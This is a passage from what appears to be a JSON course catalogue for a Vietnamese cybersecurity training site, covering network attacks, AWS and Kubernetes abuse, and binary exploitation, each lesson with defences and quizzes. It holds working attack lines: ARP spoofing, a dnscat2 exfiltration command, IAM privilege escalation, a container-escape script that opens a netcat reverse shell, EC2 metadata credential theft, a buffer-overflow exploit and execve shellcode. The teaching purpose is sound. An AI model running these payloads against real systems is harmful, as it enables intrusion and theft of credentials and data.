        "codeSnippet": "# Luật Snort phát hiện hành vi quét cổng Xmas Scan:\nalert tcp any any -> $HOME_NET any (msg:\"SCAN: Phát Hiện Kỹ Thuật Nmap Xmas Scan\"; \\\n  flags:FPU; classtype:attempted-recon; sid:1000001; rev:1;)",
        "codeLanguage": "text",
        "payloadExample": "nmap -sX -p 21,22,80,443 192.168.1.100",
        "secureSnippet": "# Biện pháp ngăn chặn:\n# 1. Cấu hình Firewall drop các gói tin TCP có cờ bất thường\n# 2. Sử dụng Fail2ban chặn IP quét quá 20 cổng trong 5 giây",
        "quiz": {
          "question": "Kiểu quét cổng Nmap nào kích hoạt đồng thời 3 cờ FIN, PSH, và URG?",
          "options": [
            "TCP SYN Stealth Scan (-sS)",
            "TCP Xmas Scan (-sX)",
            "UDP Port Scan (-sU)",
            "TCP Null Scan (-sN)"
          ],
          "correct": 1,
          "explanation": "Xmas Scan được đặt tên vì gói tin 'sáng lên như cây thông Noel' với 3 cờ FIN, PSH, URG được bật cùng một lúc."
        }
      },
      {
        "id": "s3",
        "title": "Tấn Công Đầu Độc Bảng ARP (ARP Spoofing) & Phân Tích Man-in-the-Middle TLS",
        "duration": "3h 45m",
        "objective": "Thực hiện tấn công đầu độc ARP trong mạng LAN chuyển mạch và phát hiện địa chỉ MAC trùng lặp trong gói tin Gratuitous ARP.",
        "mitre": "T1557.002 - Đầu độc bảng ARP (ARP Poisoning)",
        "cve": "CWE-300: Tấn công kẻ đứng giữa (Channel Accessible by Non-Endpoint)",
        "theory": "Giao thức ARP hoạt động ở Tầng 2 (Data Link) không có cơ chế xác thực. Kẻ tấn công có thể liên tục gửi các gói tin ARP Reply giả mạo để lừa máy tính nạn nhân và Router rằng địa chỉ MAC của kẻ tấn công tương ứng với IP của đối phương, từ đó chuyển hướng toàn bộ lưu lượng qua máy của mình.",
        "codeSnippet": "// Khởi động tấn công ARP Poisoning qua Ettercap hoặc Bettercap:\nbettercap -iface eth0 -eval \"net.probe on; set arp.spoof.targets 192.168.1.50; arp.spoof on\"",
        "codeLanguage": "bash",
        "payloadExample": "arpspoof -i eth0 -t 192.168.1.50 192.168.1.1",
        "secureSnippet": "// Cấu hình tính năng Dynamic ARP Inspection (DAI) trên Switch:\nswitch(config)# ip dhcp snooping\nswitch(config)# ip dhcp snooping vlan 10\nswitch(config)# ip arp inspection vlan 10",
        "quiz": {
          "question": "Công nghệ switch mạng nào kiểm tra tính hợp lệ của gói tin ARP dựa trên bảng liên kết DHCP Snooping để chống lại ARP Poisoning?",
          "options": [
            "Spanning Tree Protocol (STP)",
            "Dynamic ARP Inspection (DAI)",
            "VLAN Trunking Protocol (VTP)",
            "Link Aggregation (LACP)"
          ],
          "correct": 1,
          "explanation": "Dynamic ARP Inspection (DAI) kiểm tra địa chỉ IP và MAC trong các gói ARP so với cơ sở dữ liệu DHCP Snooping hợp lệ, tự động loại bỏ các gói tin ARP giả mạo."
        }
      },
      {
        "id": "s4",
        "title": "Phát Hiện Kênh Dữ Liệu Ngầm Qua Giao Thức DNS (DNS Tunneling Exfiltration)",
        "duration": "3h 00m",
        "objective": "Phát hiện mã độc đóng gói dữ liệu và trích xuất qua các truy vấn Subdomain DNS có entropy cao bằng Wireshark.",
        "mitre": "T1071.004 - Kênh liên lạc qua DNS (DNS Data Exfiltration)",
        "cve": "DNS Tunneling: Iodined / DNSCat2 Data Leaks",
        "theory": "Vì hầu hết các mạng doanh nghiệp đều cho phép lưu lượng UDP port 53 đi qua firewall để phân giải tên miền, kẻ tấn công tận dụng DNS làm kênh truyền ngầm (Covert Channel). Dữ liệu nhạy cảm được mã hóa Base64/Hex và đính kèm vào tên subdomain (ví dụ: a8f9c1d0.data.c2server.com).",
        "codeSnippet": "# Lệnh tshark phát hiện các truy vấn DNS có subdomain dài bất thường (> 50 ký tự):\ntshark -r traffic.pcap -Y \"dns.flags.response == 0 and dns.qry.name.len > 50\" \\\n  -T fields -e ip.src -e dns.qry.name",
        "codeLanguage": "bash",
        "payloadExample": "dnscat2 --dns domain=tunnel.attacker-c2.net",
        "secureSnippet": "# Cấu hình DNS Sinkhole & Response Policy Zones (RPZ):\n# 1. Chặn truy vấn tới các tên miền mới đăng ký (< 30 ngày)\n# 2. Áp dụng giới hạn tần suất (Rate Limiting) và tính toán Shannon Entropy cho subdomain",
        "quiz": {
          "question": "Dấu hiệu thống kê nào là đặc trưng rõ nét nhất của hành vi rò rỉ dữ liệu qua DNS Tunneling?",
          "options": [
            "Lượng truy vấn kỷ lục tới các subdomain có độ dài lớn và độ hỗn loạn (Entropy) cao",
            "Mọi truy vấn đều sử dụng giao thức TCP thay vì UDP",
            "Máy trạm chỉ gửi request tới Google DNS 8.8.8.8",
            "Tất cả các gói tin đều có kích thước chính xác 64 bytes"
          ],
          "correct": 0,
          "explanation": "DNS Tunneling mã hóa dữ liệu thành chuỗi ký tự ngẫu nhiên trong subdomain, khiến độ dài query tăng cao và giá trị Shannon Entropy (độ hỗn loạn chuỗi) vượt xa tên miền thông thường."
        }
      },
      {
        "id": "s5",
        "title": "Thực Hành Forensics PCAP: Trích Xuất Dữ Liệu Nhạy Cảm Bị Rò Rỉ",
        "duration": "3h 30m",
        "objective": "Điều tra file dump PCAP dung lượng lớn, tái cấu trúc tập tin truyền qua FTP/HTTP và tìm cờ Flag của cuộc tấn công.",
        "mitre": "T1048 - Trích xuất dữ liệu qua giao thức thay thế",
        "cve": "Network Forensic Investigation: Case Study Data Theft",
        "theory": "Trong các cuộc điều tra số, kỹ sư giám định pháp y mạng (Network Forensic Investigator) phải phân tích file PCAP để dựng lại toàn bộ hành trình của kẻ tấn công: từ thời điểm ban đầu, file tải về máy nạn nhân, cho đến tài liệu bị đánh cắp trước khi firewall kịp cắt kết nối.",
        "codeSnippet": "# Trích xuất tất cả tập tin truyền tải qua HTTP bằng công cụ NetworkMiner hoặc tshark:\ntshark -r investigation.pcap --export-objects http,./extracted_files/",
        "codeLanguage": "bash",
        "payloadExample": "foremost -i memory_network.pcap -o ./recovered_artifacts/",
        "secureSnippet": "# Phòng vệ toàn diện:\n# 1. Triển khai TLS Inspection (SSL Decryption) trên Next-Gen Firewall\n# 2. Mã hóa toàn bộ dữ liệu khi truyền tải (Data in Transit)\n# 3. Sử dụng giải pháp DLP (Data Loss Prevention) giám sát lưu lượng ra ngoài",
        "quiz": {
          "question": "Công cụ phân tích mạng nào có khả năng tự động phân tách và trích xuất ảnh, tài liệu và chứng thư đăng nhập từ file PCAP mà không cần cấu hình phức tạp?",
          "options": [
            "NetworkMiner",
            "Ping",
            "Traceroute",
            "Ntop"
          ],
          "correct": 0,
          "explanation": "NetworkMiner là công cụ Network Forensic Analysis Tool (NFAT) chuyên dụng, tự động tái cấu trúc các tập tin (images, docs, credentials) được truyền qua các giao thức mạng không mã hóa."
        }
      }
    ]
  },
  {
    "id": "mod-cld401",
    "code": "CLD-401",
    "category": "cloud",
    "track": "Cloud & DevSecOps / Bảo Mật Đám Mây & Kubernetes",
    "title": "Bảo Mật Hạ Tầng Điện Toán Đám Mây & Leo Thang Đặc Quyền AWS IAM",
    "difficulty": "Chuyên Gia",
    "difficultyKey": "specialist",
    "duration": "22 Giờ Học",
    "lessonsCount": 6,
    "labsCount": 5,
    "enrolledCount": "2,310",
    "mitre": "T1078.004 / T1548",
    "cert": "AWS Certified Security / CKS",
    "cvssBase": "9.6 CRITICAL",
    "threatProfile": "Đánh Cắp Danh Tính Cloud & Thoát Khỏi Container (Container Escape)",
    "description": "Khám phá các cấu hình sai phổ biến trên AWS, Azure và Kubernetes. Khai thác quyền PassRole, chiếm quyền root tổ chức qua IAM, audit S3 Bucket và kỹ thuật container escape phá vỡ cách ly nhân Linux.",
    "labLink": "/labs",
    "labId": "lab-04",
    "syllabus": [
      {
        "id": "s1",
        "title": "Mô Hình Trách Nhiệm Chung & Logic Đánh Giá Quyền Hạn Trong AWS IAM",
        "duration": "3h 00m",
        "objective": "Làm chủ logic đánh giá IAM Policy (Explicit Deny, SCP, Permission Boundary và Resource Policy).",
        "mitre": "T1078.004 - Chiếm dụng tài khoản Cloud",
        "cve": "AWS IAM Policy Evaluation Logic & Misconfiguration",
        "theory": "Trong AWS, quyền hạn được đánh giá theo thứ tự nghiêm ngặt. Nếu có bất kỳ chính sách nào chứa 'Deny' rõ ràng (Explicit Deny), quyền truy cập sẽ bị từ chối lập tức bất kể có bao nhiêu chính sách 'Allow' khác. Thiếu hiểu biết về Permission Boundary có thể tạo ra kẽ hở cho phép tài khoản phụ tự cấp quyền Administrator.",
        "codeSnippet": "// IAM Policy cấu hình lỏng lẻo nguy hiểm:\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"iam:*\",\n      \"Resource\": \"*\"\n    }\n  ]\n}",
        "codeLanguage": "json",
        "payloadExample": "aws iam list-attached-user-policies --user-name target-contractor",
        "secureSnippet": "// Bản vá an toàn: Áp dụng nguyên tắc đặc quyền tối thiểu (Least Privilege)\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\"s3:GetObject\"],\n      \"Resource\": \"arn:aws:s3:::company-public-assets/*\"\n    }\n  ]\n}",
        "quiz": {
          "question": "Trong quy trình đánh giá quyền hạn của AWS IAM, yếu tố nào luôn có quyền ưu tiên tuyệt đối cao nhất?",
          "options": [
            "Chính sách Explicit Deny",
            "Chính sách AdministratorAccess",
            "Chính sách Service Control Policy (SCP)",
            "Chính sách Inline Allow"
          ],
          "correct": 0,
          "explanation": "Trong AWS IAM, một phát biểu Explicit Deny luôn ghi đè và vô hiệu hóa mọi phát biểu Allow, không có bất kỳ ngoại lệ nào."
        }
      },
      {
        "id": "s2",
        "title": "21 Kịch Bản Khai Thác Leo Thang Đặc Quyền AWS IAM (IAM Privilege Escalation Vectors)",
        "duration": "4h 30m",
        "objective": "Khai thác các quyền CreatePolicyVersion, SetDefaultPolicyVersion và PassRole để đạt quyền AdministratorAccess.",
        "mitre": "T1548 - Lạm dụng cơ chế leo thang đặc quyền",
        "cve": "Rhino Security Labs: 21 AWS IAM Privilege Escalation Vectors",
        "theory": "Nếu một tài khoản người dùng chỉ có quyền iam:CreatePolicyVersion, họ có thể tạo phiên bản mới cho chính sách hiện tại với quyền Administrator ('Action': '*') và đặt làm mặc định, từ đó biến tài khoản quyền thấp thành Super Admin của toàn bộ AWS Account.",
        "codeSnippet": "# Khai thác quyền CreatePolicyVersion qua AWS CLI:\naws iam create-policy-version \\\n  --policy-arn arn:aws:iam::123456789012:policy/TargetPolicy \\\n  --policy-document file://admin-policy.json \\\n  --set-as-default",
        "codeLanguage": "bash",
        "payloadExample": "aws iam attach-user-policy --user-name my-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        "secureSnippet": "# Phòng vệ IAM:\n# 1. Đặt IAM Permissions Boundary ngăn người dùng tự nâng quyền\n# 2. Sử dụng AWS IAM Access Analyzer rà soát các chính sách dư thừa quyền",
        "quiz": {
          "question": "Quyền IAM nào cho phép kẻ tấn công gán một IAM Role có đặc quyền quản trị viên cho một máy ảo EC2 mới tạo?",
          "options": [
            "iam:PassRole",
            "iam:ListUsers",
            "ec2:DescribeInstances",
            "s3:ListAllMyBuckets"
          ],
          "correct": 0,
          "explanation": "iam:PassRole cho phép truyền một IAM role sang dịch vụ AWS (như EC2 hoặc Lambda). Kẻ tấn công có thể khởi chạy EC2 với Admin role và trích xuất credentials từ đó."
        }
      },
      {
        "id": "s3",
        "title": "Kiểm Toán An Toàn S3 Bucket, Cấu Hình ACL & Mã Hóa Dữ Liệu SSE-KMS",
        "duration": "3h 15m",
        "objective": "Dò quét các S3 Bucket không xác thực, phân tích Bucket Policies và cấu hình mã hóa khóa quản lý riêng qua AWS KMS.",
        "mitre": "T1530 - Đánh cắp dữ liệu từ Cloud Storage",
        "cve": "CWE-284: Kiểm Soát Truy Cập S3 Bị Lỏng Lẻo (Public S3 Leaks)",
        "theory": "Rò rỉ dữ liệu S3 là nguyên nhân của hàng trăm vụ vi phạm dữ liệu lớn nhất thế giới. Kẻ tấn công sử dụng các công cụ như S3Scanner để phát hiện các bucket mở quyền truy cập 'AllUsers' hoặc 'AuthenticatedUsers' (nhóm này bao gồm bất kỳ ai có tài khoản AWS bất kỳ trên toàn cầu).",
        "codeSnippet": "// S3 Bucket Policy mở quyền đọc công khai nguy hiểm:\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"PublicReadGetObject\",\n      \"Effect\": \"Allow\",\n      \"Principal\": \"*\",\n      \"Action\": \"s3:GetObject\",\n      \"Resource\": \"arn:aws:s3:::customer-pii-backup/*\"\n    }\n  ]\n}",
        "codeLanguage": "json",
        "payloadExample": "aws s3 sync s3://company-confidential-backups/ ./stolen_data/ --no-sign-request",
        "secureSnippet": "// Bật tính năng S3 Block Public Access toàn cục:\naws s3api put-public-access-block \\\n  --bucket target-bucket \\\n  --public-access-block-configuration \"BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true\"",
        "quiz": {
          "question": "Trong cấu hình phân quyền AWS S3, nhóm đối tượng 'AuthenticatedUsers' đại diện cho ai?",
          "options": [
            "Chỉ các nhân viên nội bộ trong cùng tài khoản AWS của công ty",
            "Bất kỳ người dùng nào có tài khoản AWS hợp lệ trên toàn thế giới",
            "Chỉ các quản trị viên đã cấu hình MFA",
            "Khách truy cập đã đăng nhập tài khoản Google"
          ],
          "correct": 1,
          "explanation": "Một sai lầm kinh điển: 'AuthenticatedUsers' bao gồm BẤT KỲ AI có tài khoản AWS nào trên toàn cầu, không hề giới hạn trong tổ chức của bạn."
        }
      },
      {
        "id": "s4",
        "title": "Tăng Cường Bảo Mật Cụm Kubernetes: Cấu Hình RBAC & Pod Security Standards",
        "duration": "4h 00m",
        "objective": "Cấu hình vai trò Kubernetes RBAC, audit security context của container đặc quyền và áp dụng Kyverno admission controller.",
        "mitre": "T1611 - Thoát khỏi Container sang Host Node",
        "cve": "CIS Kubernetes Benchmark v1.8 & Pod Security Standards",
        "theory": "Kubernetes điều khiển hàng ngàn container trong môi trường cloud-native. Cấu hình lỏng lẻo như cho phép pod chạy dưới dạng 'privileged: true' hay mount thư mục '/var/run/docker.sock' của host node sẽ biến một lỗi web đơn giản thành thảm họa chiếm toàn bộ cụm máy chủ.",
        "codeSnippet": "# Pod Spec cấu hình sai cực kỳ nguy hiểm (Cho phép thoát container):\napiVersion: v1\nkind: Pod\nmetadata:\n  name: vulnerable-pod\nspec:\n  containers:\n  - name: app\n    image: nginx\n    securityContext:\n      privileged: true # Cấp toàn quyền truy cập nhân Linux của Host\n    volumeMounts:\n    - mountPath: /host\n      name: host-volume\n  volumes:\n  - name: host-volume\n    hostPath:\n      path: /",
        "codeLanguage": "yaml",
        "payloadExample": "kubectl auth can-i create pods --as=system:serviceaccount:default:web-sa",
        "secureSnippet": "# Cấu hình Pod Security Standard chế độ Restricted:\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: secure-apps\n  labels:\n    pod-security.kubernetes.io/enforce: restricted\n    pod-security.kubernetes.io/audit: restricted",
        "quiz": {
          "question": "Rủi ro an ninh nghiêm trọng nhất khi mount tập tin '/var/run/docker.sock' của host vào bên trong một Pod là gì?",
          "options": [
            "Pod sẽ tiêu tốn gấp đôi dung lượng RAM",
            "Container có thể giao tiếp trực tiếp với Docker Daemon của host để tạo container mới quyền root chiếm quyền máy chủ vật lý",
            "Thời gian tải ảnh Docker bị chậm đi 30%",
            "Tập tin log của Kubernetes bị xóa tự động"
          ],
          "correct": 1,
          "explanation": "Truy cập vào Docker socket tương đương với việc cấp quyền root trên host machine, vì người bên trong pod có thể ra lệnh cho Docker daemon tạo container đặc quyền gắn ổ cứng host."
        }
      },
      {
        "id": "s5",
        "title": "Kỹ Thuật Thoát Khỏi Container: Khai Thác Privileged Pods & Docker Socket",
        "duration": "3h 45m",
        "objective": "Thực hiện tấn công phá vỡ cách ly namespace và cgroups của Linux kernel để chiếm shell root trên máy chủ vật lý.",
        "mitre": "T1611 - Phá vỡ cách ly container (Container Escape)",
        "cve": "CVE-2022-0492: Linux Kernel cgroups Container Breakout",
        "theory": "Container không phải là máy ảo. Chúng sử dụng chung nhân Linux (Kernel) với máy chủ vật lý và chỉ được cách ly bởi Linux Namespaces (PID, Mount, Net) và cgroups. Khi container có cờ SYS_ADMIN hoặc Privileged, kẻ tấn công có thể mount lại ổ đĩa máy chủ (host disk) hoặc lạm dụng tính năng release_agent của cgroups để thực thi mã ngoài host.",
        "codeSnippet": "#!/bin/sh\n# Kỹ thuật cgroups release_agent container breakout:\nmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp\nmkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\necho '#!/bin/sh' > /cmd\necho \"nc 10.10.14.89 4444 -e /bin/sh\" >> /cmd\nchmod a+x /cmd\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"",
        "codeLanguage": "bash",
        "payloadExample": "chroot /host /bin/bash",
        "secureSnippet": "# Biện pháp phòng chống:\n# 1. Không bao giờ chạy container với cờ --privileged\n# 2. Sử dụng gVisor hoặc Kata Containers để cách ly kernel riêng biệt\n# 3. Kích hoạt AppArmor / SELinux profile nghiêm ngặt",
        "quiz": {
          "question": "Tính năng cốt lõi nào của nhân Linux chịu trách nhiệm phân tách và cô lập ranh giới tiến trình (PID, Network, Mount) giữa container và host?",
          "options": [
            "Linux Namespaces",
            "Swap Partition",
            "CRON Scheduler",
            "Initramfs"
          ],
          "correct": 0,
          "explanation": "Linux Namespaces (PID, Mount, Network, IPC, UTS, User) là cơ chế nền tảng tạo ra sự cô lập giữa tiến trình bên trong container và hệ điều hành host."
        }
      },
      {
        "id": "s6",
        "title": "Thao Trường Cloud Capstone: Tấn Công Xâm Nhập Ngang Từ EC2 Lên AWS Org Root",
        "duration": "3h 30m",
        "objective": "Kết hợp lỗ hổng SSRF trên EC2, trích xuất token role, pivot sang DynamoDB và chiếm đoạt tài khoản Root của tổ chức.",
        "mitre": "T1078.004 & T1538 - Xâm nhập ngang hạ tầng Cloud",
        "cve": "Cloud Attack Chain: SSRF to IAM Full Admin Takeover",
        "theory": "Trong các sự cố thực tế như vụ rò rỉ dữ liệu của Capital One, cuộc tấn công bắt đầu từ một lỗi SSRF trên máy chủ web WAF. Kẻ tấn công lấy được IAM temporary credentials, sau đó sử dụng các credentials này để liệt kê và tải về hàng trăm bucket S3 nhạy cảm của doanh nghiệp.",
        "codeSnippet": "// Trích xuất IAM temporary keys từ EC2 Metadata:\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole\n// Cấu hình vào AWS CLI cục bộ của hacker:\nexport AWS_ACCESS_KEY_ID=\"AKIA...\"\nexport AWS_SECRET_ACCESS_KEY=\"...\"\nexport AWS_SESSION_TOKEN=\"...\"",
        "codeLanguage": "bash",
        "payloadExample": "aws sts get-caller-identity",
        "secureSnippet": "# Phòng thủ toàn diện cho Cloud:\n# 1. Bật AWS GuardDuty phát hiện hành vi sử dụng credentials ngoài VPC\n# 2. Bắt buộc IMDSv2 với Hop-Limit = 1\n# 3. Áp dụng SCP (Service Control Policies) giới hạn các hành động nguy hiểm",
        "quiz": {
          "question": "Dịch vụ nào của AWS ghi lại toàn bộ lịch sử các lệnh API được gọi trong toàn bộ AWS Organization để phục vụ điều tra forensics?",
          "options": [
            "AWS CloudTrail",
            "Amazon Route 53",
            "Amazon ElastiCache",
            "AWS Elastic Beanstalk"
          ],
          "correct": 0,
          "explanation": "AWS CloudTrail là dịch vụ cốt lõi ghi nhận mọi API call (ai gọi, từ IP nào, thời gian nào, tham số gì) trong toàn bộ tài khoản AWS phục vụ việc kiểm toán an ninh."
        }
      }
    ]
  },
  {
    "id": "mod-rev501",
    "code": "REV-501",
    "category": "reverse",
    "track": "Binary Exploitation / Khai Thác Nhị Phân & Dịch Ngược",
    "title": "Khai Thác Nhị Phân, Tràn Bộ Đệm Stack x86_64 & Dịch Ngược Ghidra",
    "difficulty": "Chuyên Gia",
    "difficultyKey": "specialist",
    "duration": "26 Giờ Học",
    "lessonsCount": 6,
    "labsCount": 5,
    "enrolledCount": "1,870",
    "mitre": "T1203 / T1059",
    "cert": "OSCE / eCRE",
    "cvssBase": "9.8 CRITICAL",
    "threatProfile": "Lỗi Tràn Bộ Nhớ & Chế Tạo Shellcode Thực Thi Mã Từ Xa",
    "description": "Đào sâu vào thanh ghi CPU x86_64, cấu trúc ngăn xếp stack frame và lỗi tham chiếu con trỏ bộ nhớ. Dịch ngược file thực thi ELF/PE trong Ghidra, viết shellcode tùy biến và bypass các cơ chế bảo vệ ASLR, DEP/NX, Stack Canaries.",
    "labLink": "/labs",
    "labId": "lab-05",
    "syllabus": [
      {
        "id": "s1",
        "title": "Kiến Trúc Bộ Vi Xử Lý x86_64, Thanh Ghi & Quy Ước Gọi Hàm (Calling Conventions)",
        "duration": "3h 30m",
        "objective": "Nắm vững các thanh ghi RAX, RBX, RDI, RSI, RBP, RSP và quy ước gọi hàm System V AMD64 ABI.",
        "mitre": "T1203 - Khai thác thực thi mã cấp client",
        "cve": "x86_64 Architecture & Stack Frame Mechanics",
        "theory": "Trong kiến trúc x86_64 trên Linux, 6 tham số nguyên đầu tiên truyền vào một hàm được lưu trong các thanh ghi theo thứ tự: RDI, RSI, RDX, RCX, R8, R9. Thanh ghi RSP trỏ tới đỉnh của ngăn xếp (Stack Top), còn RBP đóng vai trò là con trỏ cơ sở (Base Pointer) định vị biến cục bộ.",
        "codeSnippet": "// Minh họa hợp ngữ Assembly x86_64 gọi hàm:\nmov rdi, message_ptr   ; Tham số 1: con trỏ chuỗi\nmov rsi, 42            ; Tham số 2: số nguyên\ncall vulnerable_func   ; Gọi hàm và đẩy Return Address (RIP) vào Stack",
        "codeLanguage": "assembly",
        "payloadExample": "gdb -q ./vulnerable_binary -ex \"disassemble main\"",
        "secureSnippet": "// Quy tắc lập trình an toàn:\n// 1. Biên dịch với cờ -Wall -Wextra -Werror\n// 2. Sử dụng các ngôn ngữ an toàn bộ nhớ (Rust, Go) thay cho C/C++ thuần",
        "quiz": {
          "question": "Trong quy ước gọi hàm System V AMD64 ABI của Linux x86_64, thanh ghi nào chứa tham số đầu tiên được truyền vào một hàm?",
          "options": [
            "RDI",
            "RAX",
            "RSP",
            "RBX"
          ],
          "correct": 0,
          "explanation": "Theo chuẩn System V ABI trên Linux 64-bit, tham số đầu tiên luôn được truyền qua thanh ghi RDI, tiếp theo là RSI, RDX, RCX, R8 và R9."
        }
      },
      {
        "id": "s2",
        "title": "Làm Chủ Trình Dịch Ngược NSA Ghidra & Phân Tích Tĩnh Cấu Trúc Nhị Phân",
        "duration": "4h 00m",
        "objective": "Dịch ngược file ELF stripped và file PE trong công cụ Ghidra của NSA, khôi phục tên hàm và cấu trúc dữ liệu bị che giấu.",
        "mitre": "T1027 - Che giấu tập tin và thông tin mã độc",
        "cve": "Reverse Engineering: Phân Tích Mã Độc Nhị Phân",
        "theory": "Ghidra là bộ công cụ dịch ngược (Software Reverse Engineering) mã nguồn mở do NSA phát triển. Decompiler của Ghidra có khả năng chuyển đổi trực tiếp mã máy x86/ARM/MIPS sang mã giả C (Decompiled C Code), giúp chuyên gia nhận diện các hàm sao chép chuỗi không an toàn như strcpy, gets, sprintf.",
        "codeSnippet": "// Mã C dễ tổn thương sau khi dịch ngược qua Ghidra:\nvoid check_license(void) {\n  char user_key[64];\n  puts(\"Nhập License Key:\");\n  gets(user_key); // LỖ HỔNG: gets() không giới hạn số lượng byte đọc vào buffer!\n  if (strcmp(user_key, \"SUPER_SECRET\") == 0) {\n    grant_access();\n  }\n}",
        "codeLanguage": "c",
        "payloadExample": "python3 -c \"import pwn; r = pwn.process('./binary'); r.sendline(pwn.cyclic(120))\"",
        "secureSnippet": "// Bản vá an toàn trong C: Sử dụng fgets với giới hạn kích thước buffer\nvoid check_license_safe(void) {\n  char user_key[64];\n  puts(\"Nhập License Key:\");\n  if (fgets(user_key, sizeof(user_key), stdin) != NULL) {\n    user_key[strcspn(user_key, \"\\n\")] = 0; // Xóa ký tự newline\n    if (strcmp(user_key, \"SUPER_SECRET\") == 0) {\n      grant_access();\n    }\n  }\n}",
        "quiz": {
          "question": "Trong ngôn ngữ C, hàm xử lý chuỗi nào bị coi là cực kỳ nguy hiểm và bị cấm sử dụng vì hoàn toàn không kiểm tra độ dài buffer đích?",
          "options": [
            "gets()",
            "fgets()",
            "snprintf()",
            "strncat()"
          ],
          "correct": 0,
          "explanation": "Hàm gets() đọc ký tự từ stdin cho đến khi gặp ký tự xuống dòng mà không quan tâm kích thước buffer, là thủ phạm gây ra vô số lỗi tràn bộ đệm stack trong lịch sử."
        }
      },
      {
        "id": "s3",
        "title": "Khai Thác Lỗi Tràn Bộ Đệm Ngăn Xếp (Stack-Based Buffer Overflow) & Chiếm Quyền RIP",
        "duration": "4h 30m",
        "objective": "Tính toán khoảng cách padding bằng chuỗi de Bruijn cyclic pattern và ghi đè con trỏ địa chỉ trở về (Saved Return Pointer - RIP).",
        "mitre": "T1203 - Làm hỏng bộ nhớ ngăn xếp (Stack Corruption)",
        "cve": "CWE-121: Tràn Bộ Đệm Ngăn Xếp (Stack-based Buffer Overflow)",
        "theory": "Khi dữ liệu ghi vào một mảng cục bộ trên stack vượt quá kích thước được cấp phát, nó sẽ ghi đè lên các biến lân cận, frame pointer (RBP) và cuối cùng là Saved RIP. Khi hàm kết thúc và thực hiện lệnh 'ret', CPU sẽ nạp giá trị bị ghi đè vào thanh ghi con trỏ lệnh RIP, chuyển hướng luồng thực thi sang payload của kẻ tấn công.",
        "codeSnippet": "// Đoạn mã Python exploit tràn bộ đệm bằng pwntools:\nfrom pwn import *\ntarget = process('./vuln_app')\noffset = 72 # Tính toán qua cyclic pattern\npayload = b\"A\" * offset + p64(0x0000000000401156) # Địa chỉ hàm win()\ntarget.sendline(payload)\ntarget.interactive()",
        "codeLanguage": "python",
        "payloadExample": "python3 -c \"print('A'*72 + 'V\u0011@\u0000\u0000\u0000\u0000\u0000')\" | ./vuln_app",
        "secureSnippet": "// Biên dịch với cờ bảo vệ Stack Canary của GCC:\n// gcc -fstack-protector-all -Wformat -Wformat-security -o secure_app vuln.c",
        "quiz": {
          "question": "Cơ chế an ninh nào chèn một giá trị ngẫu nhiên (Canary) ngay trước Saved Return Pointer trên stack để phát hiện hành vi ghi đè bộ nhớ trước khi hàm trả về?",
          "options": [
            "Stack Canary (Stack Guard)",
            "ASLR (Address Space Layout Randomization)",
            "DEP (Data Execution Prevention)",
            "Chế độ SafeSEH"
          ],
          "correct": 0,
          "explanation": "Stack Canary đặt một giá trị bí mật trước Saved RIP. Khi hàm kết thúc, compiler kiểm tra xem canary có bị thay đổi không; nếu bị thay đổi, chương trình sẽ crash ngay lập tức qua __stack_chk_fail."
        }
      },
      {
        "id": "s4",
        "title": "Kỹ Thuật Viết Shellcode Linux x86_64 Không Chứa Byte Null",
        "duration": "4h 15m",
        "objective": "Tự tay viết mã máy x86_64 assembly gọi syscall execve('/bin/sh', NULL, NULL) và loại bỏ hoàn toàn các byte 0x00.",
        "mitre": "T1059 - Trình thông dịch lệnh và script",
        "cve": "Shellcode Crafting: Linux x86_64 Execve Stager",
        "theory": "Hàm strcpy và các hàm chuỗi trong C coi byte 0x00 (Null Byte) là ký tự kết thúc chuỗi. Nếu shellcode chứa 0x00, nó sẽ bị cắt cụt. Để tránh byte null, hacker sử dụng các thanh ghi con (như AL thay vì RAX) hoặc dùng lệnh XOR thanh ghi với chính nó (xor eax, eax) để tạo giá trị 0 mà không dùng mã máy 0x00.",
        "codeSnippet": "; Shellcode x86_64 không chứa byte Null:\nglobal _start\nsection .text\n_start:\n    xor rsi, rsi           ; argv = NULL\n    push rsi               ; Đẩy byte null kết thúc chuỗi\n    mov rdi, 0x68732f2f6e69622f ; chuỗi \"/bin//sh\" dưới dạng hex little-endian\n    push rdi\n    mov rdi, rsp           ; rdi trỏ tới chuỗi \"/bin//sh\"\n    push 59                ; 59 là số hiệu syscall của sys_execve\n    pop rax\n    cdq                    ; rdx = NULL\n    syscall                ; Kích hoạt thực thi shell",
        "codeLanguage": "assembly",
        "payloadExample": "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05",
        "secureSnippet": "// Bật tính năng Non-Executable Stack (NX/DEP):\n// gcc -z noexecstack -o protected_binary source.c",
        "quiz": {
          "question": "Số hiệu System Call (Syscall Number) của hàm 'sys_execve' trên hệ điều hành Linux x86_64 là bao nhiêu?",
          "options": [
            "59 (0x3b)",
            "1 (sys_exit)",
            "11 (Linux 32-bit execve)",
            "60 (sys_exit64)"
          ],
          "correct": 0,
          "explanation": "Trên kiến trúc Linux 64-bit, syscall số 59 (0x3b) ứng với hàm execve, được nạp vào thanh ghi RAX trước khi thực thi lệnh 'syscall'."
        }
      },
      {
        "id": "s5",
        "title": "Xây Dựng Chuỗi ROP (Return-Oriented Programming) & Bypass Bảo Vệ ASLR/NX",
        "duration": "5h 00m",
        "objective": "Vượt qua cơ chế cấm thực thi vùng stack (NX/DEP) bằng cách ghép các đoạn mã Gadget kết thúc bằng lệnh 'ret' để gọi system('/bin/sh').",
        "mitre": "T1055 - Return-Oriented Programming (ROP)",
